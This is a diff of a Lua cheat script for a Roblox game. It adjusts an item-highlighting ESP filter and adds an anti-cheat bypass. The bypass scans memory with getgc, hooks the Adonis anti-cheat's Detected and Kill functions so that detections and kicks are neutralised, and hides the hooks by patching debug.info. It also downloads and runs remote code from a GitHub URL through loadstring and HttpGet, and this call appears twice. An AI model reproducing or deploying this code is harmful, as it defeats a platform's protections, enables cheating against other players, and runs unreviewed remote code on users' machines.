@@ -612,8 +612,8 @@ end
 -- ESP Settings
 local espEnabled = false
 local espObjects = {}           -- BillboardGui cache
-local espFilteredItems = {} -- items currently shown in ESP (all by default)
 local itemConnections = {}      -- ONE declaration only
+local espFilteredItems = {}
 
 local itemNames = {
     "Arrow",
@@ -640,7 +640,6 @@ local itemNames = {
     "Banknote",  -- ← keep this if you still want banknotes highlighted
 }
 
--- Initialize filter with all items selected
 for _, name in ipairs(itemNames) do
     table.insert(espFilteredItems, name)
 end
@@ -926,8 +925,74 @@ local function isSafeToGrab(obj)
     return true
 end
 
--- === Adonis Anti-Cheat Bypass ===
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
+-- Adonis Anti-Cheat Bypass
+
+local executorName = (identifyexecutor and identifyexecutor() or ""):lower()
+local isXenoOrSolara = executorName:find("xeno") or executorName:find("solara") or XENO ~= nil or SOLARA ~= nil
+
+if not isXenoOrSolara then
+	task.spawn(function()
+		local g = getinfo or debug.getinfo
+		local d = false
+		local h = {}
+		local x, y
+
+		setthreadidentity(2)
+
+		for i, v in getgc(true) do
+			if typeof(v) == "table" then
+				local a = rawget(v, "Detected")
+				local b = rawget(v, "Kill")
+
+				if typeof(a) == "function" and not x then
+					x = a
+					local o; o = hookfunction(x, function(c, f, n)
+						if c ~= "_" then
+							if d then
+								warn(`[CHITO] Adonis flagged | Method: {c} | Info: {f}`)
+							end
+						end
+						return true
+					end)
+					table.insert(h, x)
+				end
+
+				if rawget(v, "Variables") and rawget(v, "Process") and typeof(b) == "function" and not y then
+					y = b
+					local o; o = hookfunction(y, function(f)
+						if d then
+							warn(`[CHITO] Adonis kill blocked: {f}`)
+						end
+					end)
+					table.insert(h, y)
+				end
+			end
+		end
+
+		local o; o = hookfunction(getrenv().debug.info, newcclosure(function(...)
+			local a, f = ...
+			if x and a == x then
+				return coroutine.yield(coroutine.running())
+			end
+			return o(...)
+		end))
+
+		setthreadidentity(7)
+
+		if x or y then
+			print("[CHITO] Adonis bypass active" .. (x and " | Detected hooked" or "") .. (y and " | Kill hooked" or ""))
+		else
+			warn("[CHITO] Adonis bypass: functions not found")
+		end
+	end)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
+end
+
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
 
 ------ FUNCTIONS --------
 
